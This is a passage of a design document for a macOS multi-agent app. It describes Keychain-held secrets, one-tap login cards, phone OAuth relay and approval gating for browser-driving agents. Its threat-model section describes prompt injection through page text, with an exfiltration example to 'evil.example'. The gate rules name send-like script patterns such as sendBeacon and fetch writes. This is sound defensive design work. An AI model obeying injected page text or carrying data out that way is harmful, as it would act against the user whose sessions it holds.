`ship-studio-agent-<agent id>`, one item per variable, and wakes the agent
with the variable's name and the reference (`secret:finance/stripe_key`).
Deny wakes it with a plain refusal (or the user's note). The registry keeps
names, purpose, reference, created and last-used only.

**Use: environment variables.** Each turn is a fresh `claude` process, so
that agent's turns (and no other's) start with its secrets as variables
(`$STRIPE_KEY`; a login's fields as `$BANK_USERNAME`, `$BANK_PASSWORD`), and
the turn's prompt lists which it has. Chosen over a `use_secret`
substitution tool because it needs no command runner of our own, works for
scripts and SDKs that read the environment, and an approval card shows the
command with `$STRIPE_KEY` unexpanded. Variables that change the shell,
Claude Code, the linker or git (`PATH`, `CLAUDE*`, `DYLD_*`, `GIT_*`…) are
refused as names. "Last used" is the last turn started with it; whether the
agent read it isn't known.

**Redaction** (defence in depth): every known value (loaded at launch, and on
save or injection; 6+ characters) becomes `[secret:…]` in every line the
store appends (chat log, card answers), the queue, recorded and emitted
messages (a session's question card included: its question, options and
the answer picked, in every chat that holds it), drafts, the activity line,
the prompt piped to the next turn, and the remote/agents audit log. Not covered: a turn that prints the variable
sends it to Claude as tool output and into Claude Code's own transcript; the
prompt forbids printing one.

Every agent is told to ask for an account with `request_login` (below,
"Logins"), to use `request_secret` only for an API key made for programs,
and never to ask for a password or a credential in chat. If the composer holds something key-shaped (Stripe,
GitHub, OpenAI, Anthropic, AWS, Slack, Google, JWT, `password=…`), a quiet
line offers "Store it securely" (`agents_add_secret`), which replaces it in
the draft with its variable; it never blocks sending. Edit agent → Secrets
lists them with Revoke, which deletes the Keychain items; deleting an agent
deletes its items too. macOS only, like workspace credentials.

## Logins (`agents/logins.rs`, `agents/connections.rs`, `agents/oauth.rs`)

Answers: **when an agent needs an account, can the user give it access in
one tap, from the desk or the phone, without a password ever passing
through a chat, and take it back later?**

An agent calls `request_login {service, account_hint?, scopes?, why}`
(every agent; the per-turn `## Logins` rules tell every agent, imported ones
included, to use it and never to ask for a password). One card lands in its
chat: "Recruiter needs your Gmail (work)", what it's for, what it will be able
to do (read; and, when `scopes` asks for more, send/post/change, which
"asks you on a card each time"), and the ways in, best first:

| Tier | Way in | Where the sign-in is kept | Engines |
| --- | --- | --- | --- |
| 1 | **Use \<account>**: an account already connected (ours) for another agent | as below | as below |
| 1 | **Connect** (ours, `oauth.rs`): the app's own OAuth in the Mac's browser | this Mac's Keychain, `<slug>-connection-<id>` | both |
| 1 | **Use GitHub on this Mac**: the `gh` sign-in | `gh`'s own Keychain item | both |
| 2 | **Use my browser**: Claude in Chrome, in the user's own Chrome where they're signed in; every click/post/send/pay asks. The default for every service without our own OAuth (Gmail, Calendar, Drive, Slack, LinkedIn, X…) | nowhere new | Claude Code |
| 3 | **Connect in Claude instead** (optional, after the browser): "Connect Gmail in Claude: it opens Claude's connectors page; turn on Gmail, then come back." Opens Claude's connectors page (Customize → Connectors, below) in the Mac's browser if it isn't added yet; the card watches `claude mcp list` (every 20 s, and at once when the window or the phone app comes back, `agents_logins_recheck`) until it's connected. If it doesn't, the card says to use the browser instead: never a dead end. A claude.ai connection made for another agent sits here too | claude.ai | Claude Code |
| 4 | **Enter an API key**: the masked field (`secrets.rs`), only where a key made for programs is a real way in (X API, Stripe restricted key, an app we don't know) | this Mac's Keychain | both |

A service with no connector says so in one line on the card ("LinkedIn has
no connector agents can sign in to."), instead of a password field. A Codex
agent is told plainly what it can't use (claude.ai connectors and the
browser are Claude Code's).

### Connecting before anyone asks: "Apps your agents can use" (`agents/app_connect.rs`)

The apps dialog (agent editor, a chat's "Connect an app…", ⌘K → "Connect an
app for agents…") connects every app with a connector of our own
(`Connector::Oauth`: Linear, Notion, Figma, Stripe, Vercel, Sentry) through
the same sign-in as a card's Connect: pick the agents and Read only / Read
and change first (the agent it was opened for is ticked, else the Chief;
never the whole team; none keeps it for a later card's "Use <account>"),
then the provider's sign-in opens in this Mac's browser, the token goes into
the Keychain, and the row says "Connected as …". Same states and words as a
card (Open again · Copy link, Stop). Works for Claude Code and Codex agents
(the relay). Who can use it is changed there too
(`agents_connection_set_grants`: the user's own answer, so it can narrow).
A granted agent's card waiting for that app is answered at once. Then
claude.ai's connectors, and Claude Code's own servers listed as such
(Claude Code agents only); a Claude Code server that is one of ours points
at Connect instead of `/mcp`. It used to `claude mcp add` the app and send
the user to a raw `claude` terminal to type `/mcp`, which first showed
Claude Code's folder-trust prompt.

**On the phone** (`mobile/src/app/apps.tsx`, from Settings → Logins and an
agent's controls, which opens it for that agent): the same list and words
(the shared ones are `packages/companion-protocol/src/apps.ts`: "Who can use
it", Read only / Read and change, where it's kept, who uses it), through
`agents.apps` (read-only, `app_connect::phone_overview`: never a token, nor
the page the Mac's browser was asked to open), `agents.appsConnect` (the
Mac's browser), `agents.appsPhoneBegin` (the phone's sign-in sheet, as a
card's: the Mac keeps the PKCE verifier and `state` in its own relay table
under the same `Table::take` rules, and the answer comes back on
`agents.loginPhoneFinish`, which hands it to `app_connect::phone_finish`
when the flow isn't a card's), `agents.appsCancel`, `agents.appsSetGrants`
and `agents.appsRemove` (asks first on the phone). Who can use it is the
user's own answer there too, so it narrows or widens at once, as on the desk;
a full grant still asks on a card before each change. Each write is audited
with the agents and access named, never the sign-in's URL or code, and
counts against the phone's per-device request limit. claude.ai's connectors
are opened on the phone (Customize → Connectors); Claude Code's own servers
aren't listed there (they're this Mac's Claude Code setup).

### Where claude.ai connectors are added (verified 2026-11-05)

`https://claude.ai/customize/connectors` (Customize → Connectors). Verified
2026-11-05 against Anthropic's own docs:
[claude.com/docs/connectors/google/gmail](https://claude.com/docs/connectors/google/gmail)
("Go to Customize > Connectors in claude.ai … Find Gmail in the list and
select Connect") and
[claude.com/docs/connectors/directory](https://claude.com/docs/connectors/directory),
which link exactly that URL. The old `claude.ai/settings/connectors` page now
says it moved to Customize. No link to one connector is documented, so the
card names the connector to look for rather than guessing a deep link.

The URL lives in one place, `packages/companion-protocol/src/links.ts`
(`CLAUDE_AI_CONNECTORS_URL`, used by the desk and the phone), with
`links.test.ts` holding it well-formed and on `/customize/connectors`; the
Rust copy (`logins::CLAUDE_AI_CONNECTORS`) is held equal to it by a test that
reads `links.ts`. Re-verify against the docs above when Claude's settings
move again, and update the date here.

### When the browser doesn't show it

Opening a sign-in goes through Tauri's opener (`open` on macOS) and logs one
line either way (`asked the OS to open a sign-in page…`, or a `warn` with
the OS's error). An "opened" page can still be invisible: on one Mac a
leftover headless Chrome from our own test tooling was the instance macOS
handed the link to. So a waiting card never only spins: it keeps the page it
opened (`flow.url`, `flow.openedAt`) and says "Opened in your browser —
didn't see it? Open again · Copy link"; if nothing has come back 20 s
(`NO_CALLBACK_MS`) after the browser was asked, it says so plainly with the
same two actions. Open again is `agents_login_reopen`. If the OS reports a
failure, the card stays waiting with the link rather than failing.

### "Not needed": an app the user doesn't want connected (`agents/declined.rs`)

Every login card and every row of "What your team needs" offers **Not
needed** beside its main action, and the list has **Skip the rest**. It is
for the app, across the team, and it is remembered
(`<agents root>/declined-services.json`):

- every waiting card for it (and every secret card that means it) closes as
  "Not needed", with a one-line receipt ("Not connecting Acme Bank. No agent
  will ask for it again.") and **Undo** for a few seconds;
- `request_login` and `request_secret` for it answer "The user chose not to
  connect … don't ask for it" instead of raising a card;
- every turn's app-owned system prompt carries "## Apps the user chose not
  to connect" (titles only, so the cache holds), telling agents to do the
  work another way or say what they can't do. No agent is woken for it.

An app the catalogue doesn't know is declined by its title (`other:acme
bank`), never as `other`, and gets a row of its own on the team list.
Turning one back on: **Undo** (within 5 minutes the cards it closed come
back as fresh cards), or "Turn back on" in "What it can reach" (desk and
phone) and Settings → Agents, after which agents may simply ask again.
Commands: `agents_login_not_needed`, `agents_logins_not_needed(keys?)`,
`agents_logins_undecline`, `agents_logins_declined`; on the phone
`agents.loginNotNeeded`, `agents.loginsNotNeeded`, `agents.loginsUndecline`
(additive: an older Mac doesn't list them and the phone doesn't offer them).
The per-agent action on a row is now **Skip** (`agents_login_dismiss`: that
agent's card). The access chain counts both as a no (below, "Just try
first", step 1): the team-wide list feeds its "Not needed" keys, and turning
an app back on records when (`turnedOn` in the same file), so a no on a card
from before then stops counting.

### Just try first (`agents/access_chain.rs`)

Answers: **does an agent get on with the job instead of asking for a login?**
"Go do this in Figma" means: look for Figma access, else use the user's
signed-in browser and say which account it's in, and ask only if both fail.

`request_login` runs the chain on the Mac before any card, per task:

1. **Said no already**, for anyone on the team (declined, or "Not needed",
   on a card or on the setup checklist, kept after the checklist is put
   away): never asked again; the agent carries on without it. A service the
   catalogue doesn't know matches however it's spelled ("Acme CRM",
   "acme-crm"). **Unless the user asks for it again**: when the user's own
   message in this turn names the service (its title, id or site name, whole
   words; `access_chain::names_service`), or the Chief or an admin passes on
   such a message (`runner::RELAYED`), the no is set aside for that request
   and the chat says so in one line ("You asked for Slack in this request, so
   the earlier no is set aside for it"). The no itself stays; outside text
   never lifts it. Before, one No to Slack blocked it until Undo, even after
   the owner asked for Slack again.
2. **Granted already**: one of our own working connections (OAuth, `gh`).
   A claude.ai connector doesn't count (it isn't always recognised in a
   turn): it's an optional extra after the browser, never the default.
3. **This Mac is signed in**: GitHub through `gh` (granted silently: the
   agent could run `gh` anyway, and every change asks through the broker).
4. **The user's browser**, when this turn has it (below) and the service has
   a site: the site is added to the agent's `browser_sites` and it's told to
   open it in a new tab and say "I'm in Figma as …" from what the page shows,
   never a guess. A sign-in page sends it back with `signed_out: true`
   (and `browser`): one in the agents' browser moves it to the user's Chrome.
4b. **A teammate already has it** (the Chief only): another agent holds the
   service through the app (a working connection granted to it, or its
   connector in its engine; `team_reach::holders`). The Chief is told to hand
   the work to that agent with `message_agent`, and no card is raised. Seen
   live on Haiku: asked "can you read my email?", the Chief found Gmail signed
   out in the agents' browser and raised a sign-in card while another agent
   had Gmail connected, and the open card kept the "can't" follow-up from
   running. Other agents still get the one-tap "Use \<account>" card below:
   it's their own job that needs it. Never for outside text.
5. **Someone's card for it is waiting**: the agent joins that card
   (`login-waiters.json`; the card shows "Also for …") and gets the same
   answer, never more access than the card allowed.
6. **One at a time**: an agent with a sign-in card waiting can't raise another.
7. Only then one card, whose first way in is a sign-in button; a key field
   only where the service has nothing else.

Every agent's `## Getting access` rules, the Chief's instructions (upgraded
by `PAST_CHIEF_INSTRUCTIONS`) and an imported agent's "Where you are now"
logins bullet (upgraded in place by exact match, `arrival::PAST_LOGINS_LINES`)
say the same: try the chain, ask only when blocked on the user's actual task,
never up front, one thing at a time, never a password or token in chat.

A connection someone else has (not this agent) still needs a one-tap "Use
\<account>" card: per-agent grants stay the wall for connectors.

**A link is read before it's browsed** (`prompts::links_section`, one
app-owned line after "Getting access", every turn). A claude.ai artifact link
(`claude.ai/artifact/…`) goes to Claude Code's `Artifact` tool with `read`:
one call returns the page and its files, where Chrome meant twenty steps
scraping a canvas. `--print` turns it off by default (the `sdk-cli`
entrypoint), so every Claude turn runs with `CLAUDE_CODE_ARTIFACT=1`
(`claude::ENV`); it needs a claude.ai sign-in. A read is a read (`autoallow`,
and runs at Bold) and counts as outside content (`exposure`), like a
fetched page; publishing, commenting or writing an artifact's rows asks
(at Unleashed only deleting one does). Codex has no `Artifact` tool: it opens
the link in the browser and says so in one line. The line fit the prompt
budget by trimming two examples from "Getting access".

### Your browser (`agents/browser.rs`)

The mechanism is Claude Code's **Claude in Chrome**: `claude --chrome` loads
the `claude-in-chrome` MCP server into a turn, which drives the Claude in
Chrome extension in the user's own Chrome (open tabs, navigate, read text or
the accessibility tree, screenshots, click, type, fill forms). The extension
must be signed in to the **same claude.ai account** as Claude Code, and Claude
Code must be signed in with claude.ai (an API key keeps it off). Codex has no
equivalent here: Codex agents never get the browser and ask instead.

**Or the app's own extension, for any engine** ("Your Chrome",
`user_chrome/`, off by default): Settings → Agents → Your Chrome sets up a
native host (the app's own binary) and the app's MV3 extension, and every
turn, Claude Code or Codex on any account, gets `mcp__user_chrome__*` with the
agents' browser's tool names. The same gate decides it (below), outside text
never gets it, and a turn that has it runs `--no-chrome`. Design, trust and
what's verified: docs/internal/own-browser-layer.md.

**Set up once, checked by the app.** ⌘K "Let agents use your browser…", the
setup checklist and "What it can reach" open one guided card: Claude Code
signed in (`claude auth status`), the extension in a Chrome profile, and a
browser answering. The last is asked of `claude --claude-in-chrome-mcp`
(the same server, over stdio) with `list_connected_browsers`: no model turn,
nothing opened. That flag isn't in `--help`; verified on 2.1.318. **Turn on**
only works once a browser answers. Teams whose user chose "Use my browser" on
a login card in an older build start switched on.

**Who gets it.** A turn runs `--chrome` only when the team's switch is on, the
agent's own isn't off, it runs on Claude Code, and the turn doesn't answer
outside text (a "When…" routine's items, or a message carrying that taint
through `message_agent` or a room): those run `--no-chrome`, and the broker
refuses any browser call they make anyway.

**What asks** (`agents/browser_gate.rs`, before Always-allow rules). The one
place the independence level changes an approval, and only for the browser:

- **Looking never asks** at "Steady" and "Bold": tabs, browsers
  and profiles, `navigate` / a new tab to *any* `http(s)` page, `read_page`,
  `get_page_text`, `find`, screenshots, zoom, scroll, hover, wait, the console
  and network, resizing, recording a GIF. Other schemes (`javascript:`,
  `file:`, `chrome:`) ask. At "Careful" only the agent's own
  `browser_sites` are free to open, and a URL carrying another URL (`//` after
  the host, plain or percent-encoded) asks.
- **Acting goes through unless it sends**, at "Steady" and "Go
  hard": a click, keystroke, form fill or batch asks only when the control's
  accessible name (what `read_page` / `find` answered for that `ref`, kept per
  agent from the stream: `browser_gate::observe`) is a send / post / publish /
  pay / buy / order / delete / remove / share / invite / submit / confirm /
  merge / deploy word (whole words: "Posts" and "Sign in" don't count), when
  Enter is pressed anywhere but a search box (or nobody knows where the cursor
  is), or when the page is a payment host or a checkout / cart / billing /
  compose / transfer page. A click by coordinate can't be named, so it goes
  through except on those pages: **an accepted gap**, as is a navigation
  carrying data in its own URL to a site the agent chose. At "Careful"
  every interaction asks.
- **Enter into a box nobody named goes back to the agent first**
  (`browser_gate::only_unlabelled_enter`): when the only thing a call would
  ask about is Enter after a click by position (or no click), the agent is
  told to find the box and click it by ref, so a search runs on its own and a
  message asks with its exact words. The same steps sent again reach the
  card. A search typed into a chat app's search box by position had raised
  "Goes out under your name" at Unleashed, expired, and stopped the check.
- **Always a card** below Bold: `javascript_tool`, `file_upload`,
  `upload_image`, `shortcuts_execute`, a GIF export and any tool this build
  doesn't know.
- **In an editor at Bold only the final step asks**
  (`browser_gate::final_submit`): a control whose name starts with a send word
  ("Post", "Send now", "Schedule", "Delete post"), or a short one holding one
  that doesn't start by describing; "Will send on Fri…", "Post text" (a text
  box), "Discard changes", "Close" and "Edit post" run. Password boxes ask at
  Bold and above. At Bold and above a click is judged by what it clicks
  (label and role), never by the page's address: an X-like scheduled-posts
  list lives under `/compose/…`, and every unlabelled click there asked. So a
  click that can't be named (by coordinate, or a `ref` nothing labelled) asks
  at Bold only on a payment host or checkout / cart / billing page: **an
  accepted gap**, the same one "Steady" accepts for ordinary
  pages; a "Post" clicked by coordinate goes through. **At Unleashed** only money, closing an account or a
  repository / project, password boxes and checkout pages ask; uploads run
  unless the file looks like a key.
- **At Bold everything runs**, `javascript_tool`, shortcuts and unknown
  tools included, except send-like clicks and keys (above), `file_upload` /
  `upload_image`, a GIF export, and a script that submits or sends
  (`go_hard::script_sends`): `.submit(` / `requestSubmit`, `sendBeacon`, a
  form's `action` changed, `fetch` / XHR with a write method or a body, jQuery
  / axios writes, or a click / Enter where a string in the script names a
  send-like control (`Send`, `…submit-button`, `type=submit`). A script that
  reads the page or clicks "See more" runs.

A browser card says what it would do in plain words ("Click “Send” on
mail.google.com", "This would send it as you"), then what it types or fills and where and as whom (`browser::card_for`: the site last opened and the account found there, `browser_profiles`), with the raw call behind
Details. Allowed steps leave only their line in "What it did". At launch every
pending browser card expires with the rest (its turn is gone); when the user
changes the level, an open browser card whose turn is still waiting and that
the browser gate now lets through is allowed with a receipt
(`mcp::sweep_auto_allowed`). Turns answering outside text still never get the browser.
`browser_sites` only ever holds a catalogue service's built-in host
(`logins::SERVICES`): the access chain, a login card's "Use my browser" and
the reach check add one; nothing an agent or an import types becomes a site.

**Which Chrome profile** (`agents/browser_profiles.rs`). The extension can sit
in more than one Chrome profile, each signed in as someone else. When the
chain hands an agent the browser, the app lists the connected browsers itself
(`list_connected_browsers`, nothing opened) and tells the agent where to
start: the profile this site was last found in, the only one, or each in
turn. The agent opens the site, reads which account it shows, and moves with
`select_browser` / `switch_browser` (looks, no card) when it's the wrong one.
With no other profile connected it calls `ask_bring_browser_to_front`. The
app first brings Chrome forward itself (opening it if closed), then one more
of its windows per call, and tells the agent what is connected now
(`browser_profiles::front_step`; AppleScript, macOS only; *not verified* in a
real turn that the extension follows the window brought forward). Only once
every window was tried does it raise one
plain card, "Bring your sam@work Chrome window to the front so I can use it",
Check again / Not now, never a login ask, joined team-wide like a login card.
`remember_browser_account` keeps site → profile and account in app data
(`browser-accounts.json`, only for the agent's own sites, never from outside
text), shown with Forget under "What it can reach". The extension's own
per-site permission prompt is left as it is. **Partly verified:** on the Mac
this was built on the extension was in two profiles but only one browser
("Browser 1") was connected at a time, so switching between two connected
profiles hasn't been seen working, and the answer's shape is read leniently
(`parse_browsers`).

**Threat model.** The agent acts as the user, in sessions the user is signed
in to. The risk is a page's own text (an email, a doc, a profile) telling the
agent to do something: prompt injection. What stands against it:
- Anything that acts on a page asks on a card, so an injected "send this",
  "delete that" or "share with x@y" reaches the user as a request.
- Navigation outside the agent's sites asks, so an injected "open
  https://evil.example/?q=<what you read>" can't carry data out silently.
  (A read-only page could still show text the agent repeats in chat; that
  stays on this Mac.)
- Text from outside never drives the browser (`--no-chrome` + refusal; a
  turn with no reach worked out runs `--no-chrome` too). Nor does it get
  anything granted through the access chain: such a turn skips the silent
  `gh` grant and the browser step and never joins another agent's card (whose
  answer would grant it); it ends on its own card.
- Passwords are never typed: the rules say stop at a sign-in page.
- The user can take it away per agent, or switch the team's off.
Not covered: the extension's own per-site permissions are the user's to set
in Chrome; a site the agent was given can still be read in full once open.

### Checking what your team can already reach (`agents/access_check.rs`)

An import used to put a card in every imported agent's chat for every login
it had used elsewhere. Now nothing is asked up front: an imported agent's
logins become **Maybe later** rows on "Setting up your team", one per service
team-wide, and the app checks them itself straight after the import (and from
⌘K "Check what your team can already reach" or the step's Check again), in
order and read-only: one of our own connections already made; this Mac's
sign-ins (`gh`, `vercel whoami`); once the team's browser is on, the
service's account page opened in a new tab, looked at (did it land on a
sign-in page?) and closed; and last, as an extra, an app in Claude Code
(`claude mcp list`: a claude.ai connector or the user's own server). Only services someone mentioned are opened; no
click, no typing; nothing kept beyond the service, how it was reached and an
account name a connection or CLI reported.

A reached row closes with a receipt ("Figma: your browser, signed in on
www.figma.com"); for the browser, the agents that mentioned it get the site.
The Logins step shows only the residue ("Your team is ready. 3 things I
couldn't reach on this Mac"), each with one sign-in button that raises one
quiet card and starts its best way in at once (others join it), or "Get your
key"/"Add a key" when a key is all there is, and Not needed. Progress is one
line on desk and phone ("Checking 14 services… Figma ✓ GitHub ✓"). Only the
app starts it: there's no agent tool for it. Quiet import cards an older build
raised are folded into rows at launch (`team_setup::fold_cards`), each closed
with a line saying so.

### Which services have a real connector (checked 2026-11)

From each vendor's published, unauthenticated metadata (an `initialize`
answered 401 with `resource_metadata`, RFC 9728 → RFC 8414). Nothing was
registered or signed in to while checking.

| Service | What we offer | From the phone, away from the Mac | Why |
| --- | --- | --- | --- |
| Linear, Notion, Figma, Stripe, Vercel | our own OAuth | **the sign-in sheet** (a), token in the Mac's Keychain | remote MCP server, dynamic client registration, PKCE S256 |
| Gmail, Google Calendar, Google Drive | claude.ai connector, else browser | **claude.ai on the phone** (same Claude account); held by claude.ai | Google publishes `gmailmcp.googleapis.com` etc., but registers no clients (an app must be approved by Google first, and Gmail's scopes are restricted) |
| Slack | claude.ai connector, else browser | **claude.ai on the phone**; held by claude.ai | `mcp.slack.com` has OAuth but no registration: it signs in only apps registered with Slack |
| GitHub | the `gh` sign-in | **GitHub's device code** (c), through `gh` on the Mac | `api.githubcopilot.com/mcp` has no registration; agents already use `gh` |
| LinkedIn | browser only | a tap (uses the Mac's Chrome, already signed in) | no connector |
| X | browser, or an X API token | a tap, or the key typed into the card | no connector; its API needs a developer account |

The UI says when there's no connector (`no_connector` on the card), and a
Codex agent is told what it can't use.

### From the phone (`agents/login_relay.rs`)

Owner requirement: access can be given **entirely from the phone, away
from the Mac**, with the credential ending up only in the Mac's Keychain.
The card shows on the phone (Mac feature `logins`); with Mac feature
`logins.phone` each way in has a phone path (`phoneWay` in
`mobile/src/lib/loginState.ts`). The options evaluated, per provider:

- **(a) The sign-in sheet, code relayed to the Mac**: chosen for every
  OAuth connector of our own. The Mac does discovery, registers a public
  client with the redirect `<companion scheme>://oauth` (the companion
  app's own scheme, from brand.json), and makes the PKCE verifier and
  `state`, which never leave it (`agents.loginPhoneBegin` returns only the
  authorization URL). The phone opens it in `expo-web-browser`'s
  `openAuthSessionAsync` (ASWebAuthenticationSession), ephemeral, so no
  cookie is kept. The sheet comes back with the one-time code; the phone
  sends the redirect, once, over the paired connection
  (`agents.loginPhoneFinish`, refused before sending unless the Mac proved
  its pinned identity, as for a secret). The Mac exchanges it with its
  verifier and stores the token. Nothing is persisted on the phone.
- **(b) Redirect to the Mac's tailnet host**: not used. It needs the
  provider to accept an `https://<mac>.ts.net` redirect registered per
  Mac, a TLS listener for it, and the phone's browser on the tailnet; (a)
  gives the same result with nothing listening.
- **(c) Device code**: used for GitHub, through `gh auth login --web` on
  the Mac (GitHub's device flow with `gh`'s own client; with no terminal
  it prints the code and waits, observed on gh 2.95). The code is put on
  the card (`flow.userCode`, `verificationUri`) for both devices, typed at
  github.com/login/device anywhere; `gh` keeps the token in its own
  Keychain item. Not offered for Google: its device flow excludes Gmail's
  scopes and registers no client of ours.
- **claude.ai connectors**: added on claude.ai on the phone
  (`agents.loginStart` with `onPhone`: the Mac doesn't open its browser and
  watches `claude mcp list`). The sign-in is held by claude.ai, never this
  Mac or the phone, and the card says so.
- **No sign-in** (an account already connected, the browser, a key): a
  tap, or the masked field (as `saveSecret`), from either device.
- **"Finish on your Mac"** is the fallback: an older Mac (no
  `logins.phone`), an installed phone build without the sign-in sheet's
  native module (it predates `expo-web-browser`; the phone checks
  `requireOptionalNativeModule('ExpoWebBrowser')` and never imports it
  otherwise), or a provider that refuses to register the app's redirect
  (the card says so and offers the Mac).

The card's live state (`login.flow`: starting / waiting / failed /
cancelled, plus `fromPhone`, `onPhone`, `userCode`) is laid over the card
wherever it's read (`logins::apply`) and re-emitted as the card on every
change, so both devices follow it with no new event. Connected, declined
and "Not needed" are the card's own answer (`status` + `choice` / `note`).
A phone from before login cards sees a plain Allow / Deny card: its Allow
starts the card's first way in on the Mac (`allow_from_old_client`), its
Deny declines.

#### The code relay's rules (`login_relay::Table::take`, tested)

- Accepted only from the device id that began it (the paired device the
  socket authenticated as); another paired device's answer is refused and
  doesn't spend it.
- Single use: any answer from its own device spends it, right or wrong.
- Ten minutes, then it's refused and the card says it took too long.
- Only on the exact registered redirect (scheme, host and path), only with
  the `state` this Mac made; `error=access_denied` reads as declined.
- One phone sign-in per card; Cancel, an answer, or a new one forgets it.
- Never logged: the audit line is "finished signing in on the phone", the
  router never echoes the URL, and the refusals carry no part of it.
- Threat: a stolen code is useless without the verifier, which only this
  Mac has; another app claiming the scheme doesn't receive it, since the
  sheet hands its redirect back to the app that opened it; a forged
  redirect fails `state`. A team row signed in on the phone grants the
  row's other agents the same connection once it's in (`fan_out`).

### The agents' browser (`agent_browser/`)

Owner requirement: "It's still telling me to go to my computer and enter
passwords. I want to do that from the phone." The agents get a Chrome of
their own, and the person signs in to it from the phone.

- **What it is.** The user's installed Google Chrome, started by the app
  with a profile of its own (`<app support>/agent-browser/Agents`, never the
  user's Chrome folder: `chrome::profile_is_ours`), over
  `--remote-debugging-pipe`. No TCP port (nothing else on the Mac can
  attach), no automation-masking switch, never headless (decision and
  measurements: docs/internal/agent-browser.md). One window per tab, parked
  in the bottom-right corner, not minimized. Started on first use, closed
  after 15 idle minutes, when its Settings switch goes off, for a plain
  sign-in, and when the app quits.
- **Settings → Agents → Agents' browser**, on by default
  (`agent-browser.json`). Off: no turn gets it and cards don't offer it.
  In every build unless built with the `no-agent-browser` cargo feature
  (an opt-out: as a default feature it was dropped by `tauri dev`, and the
  owner's agents all went to Claude in Chrome for a day). Launch logs
  `[AgentBrowser] available to agents` or why not, and a turn that goes
  without it logs why at info (`[AgentBrowser] not offered to this turn`).
- **The `browser` MCP server** on the agent bridge (`/mcp/browser`, the
  turn's bearer secret, `agent_browser::tools`), added to every turn of
  either engine (`connections::for_turn`) unless the switch is off, the
  agent's browser is off ("What it can reach" or its settings) or the turn
  answers outside text. Tools: `tabs`, `open`, `navigate`, `read_page`
  (the accessibility tree with `ref_N`), `find`, `get_text`, `screenshot`,
  `click`, `type`, `press`, `scroll`, `wait_for`, `close_tab`, and `ask_user_to_step_in` ("Step in", below). No script,
  upload or download tool; `type` refuses password and one-time-code
  fields; an agent sees its own tabs only.
- **Seeing it work.** Every step in "What it did" reads "Used its own
  browser · example.com" ("Using its own browser · …" while it runs), the
  site from the call or the page it's on, never the path; the user's Chrome
  still reads "Browsed …". While the agent has a tab open, a **live card**
  sits under its working line (`AgentBrowserLive.tsx`): its site, a "Live"
  dot and a 16:10 picture of the page at about two frames a second
  (`agent_browser::live`, `agents_browser_live_frame`). Pressing it opens the
  page larger in the preview pane beside the chat, with its address, view
  only; **Open in Chrome** there brings the real window forward
  (`agents_show_agent_browser`). Frames are pulled, never pushed: each ask
  renews a 4-second lease, the desk stops asking while the window is hidden
  or the card is scrolled away, and the screencast stops with it
  (`agents_browser_live_stop` stops it at once). When the turn ends, its
  reply's "What it did" keeps a still of the last picture, in memory for
  this session only. Not on the phone yet; no input from the pane yet (no
  "Take control").
- **Checked end to end** with `cargo run --example agent_browser_turn --
  <scratch>`: whether a turn gets the server, its `--mcp-config` / Codex
  entry, then `initialize`, `tools/list`, `open` example.com and
  `read_page` through the bridge's own dispatch (`tools::dispatch`), and the
  timeline's words, on a scratch profile, never the app's or the user's.
- **What asks** is `browser_gate`, the same rules as Claude in Chrome
  (`gate_agents_with` maps each tool to its Claude in Chrome equivalent):
  looking is free; a click on a control whose accessible name sends, posts,
  pays, deletes or shares asks, as does Enter outside a search box and any
  click on a checkout or compose page. Labels come from the tree the server
  read itself. An engine that asked first leaves a one-call pass
  (`tools::note_cleared`); a call nobody asked about is decided by the
  server (`mcp::decide_agents_browser`). "Bold" doesn't auto-allow a step
  the browser gate said asks (this also closed that gap for Claude in
  Chrome's send clicks).
- **Which browser** (`access_chain`): the agents' browser first; the user's
  own Chrome (Claude in Chrome) for Gmail, Google Calendar, Drive, Slack, X,
  LinkedIn and Grok (`users_chrome_first`: Google refuses a sign-in in a
  driven browser, and signed out, mail.google.com lands on Google's product
  page; X, LinkedIn and Grok are signed in only in the user's own Chrome, and
  an agent once said it "couldn't search X because the agents' browser isn't
  signed in there"), when the site
  was last found signed in only there (`browser_profiles`, site → profile; a
  site signed in in the agents' browser is remembered as `Agents`), and at
  once when the agents' browser showed a sign-in or signed-out page
  (`request_login` with `signed_out`). The agent says which account it's in,
  so the switch is never silent. A card only when Chrome is signed out too
  (`browser: "chrome"`) or the turn has no Chrome. A plain Deny on an
  import's quiet card doesn't stop the user's Chrome (it connects nothing);
  a Deny on a task's card, or one with the user's words, still does.
- **"Grok" is the user's real Grok** (grok.com, or x.com/i/grok), unless they
  name an agent. The Chief's section says so, and its team list adds a line
  for any agent named for Grok or "… Teammate": an agent on this team, an
  imported one a copy that knows only what came over (`prompts::copies_note`).
  The Chief asks Grok itself in the user's Chrome and reads the reply off the
  page; at Bold and above the Send or Enter in Grok's chat runs without a
  card (`browser_gate::assistant_chat`), since asking their own assistant
  isn't posting as them, while Share, Delete and anything elsewhere on X still
  ask. Grok can reach the Chief over Remote Access (`ask_chief`); the Chief
  can't open that channel, so it uses the browser. Observed: asked to "talk
  to Grok… GROKBOT", the Chief messaged "Grok Bot Teammate", then asked the
  owner for an X link and for "which project Grok's session is in".
- **A project tool never sends the agent back to the user** for the project:
  for an agent, "say which one" lists its projects and tells it to pick
  (`remote_access::tools::agents_pick`), and says a session is a tab in a
  project, never Grok or a teammate. The remote assistant's wording is
  unchanged.
  Observed: an import's denied Gmail card told the Chief to "carry on
  without Gmail" while Gmail was open and signed in in the user's Chrome.

#### Step in (`agents/step_in.rs`, `agent_browser/step_in.rs`)

Grok Bot lets the user take over its computer for SSO, passkeys and
CAPTCHAs. Here: an agent in its own browser that hits a step only a person
can pass calls **`ask_user_to_step_in`** (`reason`, optional `tab`) on the
`browser` server, instead of failing or asking for a password. Its tool
description and one sentence in the server's instructions say when: SSO or
"verify it's you", a passkey, a 2FA or emailed code, a CAPTCHA; a plain
sign-in on a site it's signed out of is still `request_login` with
`signed_out: true`. Nothing was added to the system prompt (its budget).

- **One card**: "<Agent> needs you in its browser: <reason>", the site and
  page title, and a line that the tab opens on this Mac and the agent never
  sees what's typed. **Not now** and **Step in** (neutral, never the
  accent). The tool returns at once; the agent stops and is woken later.
  One per agent at a time; asked again while one waits, it's told so.
- **Step in** (`agents_step_in`, desk only) brings that tab's real Chrome
  window on screen and in front (`Service::show`), so the keyboard, the
  mouse and macOS's own passkey and Touch ID sheets work as in any Chrome:
  nothing is relayed through the app. If Chrome closed meanwhile (15 idle
  minutes), the card's page opens again in a new tab of the agent's.
- **While you're in it** the tab is **held** (`agent_browser::step_in`):
  every browser call of the agent's that resolves to that tab is refused,
  reading included (`tools::tab_of`), `tabs` names it without reading it,
  and the chat's live picture of it stops (`live::frame_on`). Its other tabs
  and `open` still work. Chrome's idle close waits. The chat shows the bar
